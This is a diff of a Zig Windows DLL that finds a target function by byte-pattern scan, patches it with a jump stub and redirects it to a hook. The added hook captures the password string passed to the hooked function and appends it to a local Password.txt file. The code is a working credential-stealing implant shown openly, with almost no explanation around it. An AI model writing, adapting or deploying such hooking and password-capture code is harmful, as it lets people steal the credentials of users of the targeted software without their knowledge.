@@ -2,7 +2,53 @@ const std = @import("std");
 const windows = std.os.windows;
 const print = std.debug.print;
 
-pub export fn MyHook(_: [*:0]const u8) bool {
+extern "kernel32" fn WriteFile(
+  File: windows.HANDLE,
+  Buffer: windows.LPVOID,
+  NumberOfBytesToWrite: u32,
+  NumberOfBytesWritten: ?*u32,
+  OverLapped: ?*windows.OVERLAPPED
+) c_int;
+
+extern "kernel32" fn CreateFileA(
+  FileName: windows.LPCSTR,
+  DesiredAccess: u32,
+  SharedMode: u32,
+  SecurityAttributes: ?*windows.SECURITY_ATTRIBUTES,
+  CreationDisposal: u32,
+  FlagsAndAttributes: u32,
+  TemplateFile: ?windows.HANDLE
+) windows.HANDLE;
+
+extern "kernel32" fn SetFilePointer(
+  File: windows.HANDLE,
+  DistanceToMove: i32,
+  DistanceToMoveHigh: ?*i32,
+  MoveMethod: u32
+) u32;
+
+fn myHook(pw: [*:0]const u8) bool {
+  var i: u32 = 0;
+  const Space: u8 = ' ';
+  while (pw[i] != 0) {i += 1;}
+  const File = CreateFileA(
+    "./Password.txt", 
+    windows.GENERIC_WRITE, 
+    0x00000001, 
+    null, 
+    4, 
+    128, 
+    null
+  );
+  if (File != windows.INVALID_HANDLE_VALUE) {
+    _ = SetFilePointer(File, 0, null, windows.FILE_END);
+    _ = WriteFile(File, @constCast(@ptrCast(pw)), i, null, null);
+    _ = WriteFile(File, @constCast(@ptrCast(&Space)), 1, null, null);
+    windows.CloseHandle(File);
+  } else {
+    return false;
+  }
+  
   return true;
 }
 
@@ -15,11 +61,14 @@ var ShellCode: [12]u8 = .{
 var oldProtect: u32 = 0;
 var OriginalBytes: [12]u8 = undefined;
 const FunctionSize: usize = 80;
+
 const Pattern: [18]u8 = .{
-  0x55, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8D,
-  0x6C, 0x24, 0x50, 0x48, 0x89, 0x4D, 0xE0,
-  0x48, 0x89, 0x55, 0xE8,
+  0x55, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8D, 0x6C,
+  0x24, 0x50, 0x48, 0x89, 0x4D, 0xE0, 0x48, 0x89,
+  0x55, 0xE8,
 };
+
+
 var Function: *fn([*:0]const u8) bool = undefined;
 
 var FoundMemory: ?[]u8 = undefined;
@@ -115,8 +164,8 @@ pub export fn DllMain(_: std.os.windows.HINSTANCE, Reason: u32, _: *anyopaque) c
 
       @memcpy(&OriginalBytes, FoundMemory.?[0..12]);
       const ShellSlice: *usize = @alignCast(@ptrCast(ShellCode[2..10]));
-      ShellSlice.* = @intFromPtr(&MyHook);
-      print("MyHook: {*}\n", .{&MyHook});
+      ShellSlice.* = @intFromPtr(&myHook);
+      print("MyHook: {*}\n", .{&myHook});
 
       print("ShellCode: \n", .{});
       for (ShellCode) |Byte| {
